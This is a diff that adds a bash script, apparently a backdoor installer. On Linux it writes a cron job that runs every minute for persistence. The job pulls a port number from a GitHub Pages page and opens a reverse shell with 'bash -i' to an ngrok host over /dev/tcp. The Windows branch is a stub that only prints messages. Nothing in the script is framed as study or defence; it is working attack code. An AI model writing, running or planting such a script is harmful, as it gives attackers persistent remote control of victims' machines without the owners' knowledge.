@@ -1,0 +1,22 @@
+#!/bin/bash
+
+HOSTNAME="0.tcp.in.ngrok.io"
+PORT_URL="https://atlantissupp.github.io/backdoor/"
+
+# Detect OS
+OS=$(uname)
+if [[ "$OS" == "Linux" ]]; then
+    echo "Detected Linux system"
+    
+    # Add a cronjob to maintain persistence
+    CRON_JOB="* * * * * /bin/bash -c 'PORT=$(curl -s \"$PORT_URL\" | grep -oP '(?<=<div id=\"portnum\">)\d+(?=</div>') ) && bash -i >& /dev/tcp/$HOSTNAME/$PORT 0>&1'"
+    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+    echo "Cronjob added for persistence."
+    
+elif [[ "$OS" == "MINGW64_NT"* || "$OS" == "CYGWIN"* || "$OS" == "MSYS"* ]]; then
+    echo "Detected Windows system"
+    echo "Going to add..."
+else
+    echo "Unknown operating system. Exiting."
+    exit 1
+fi
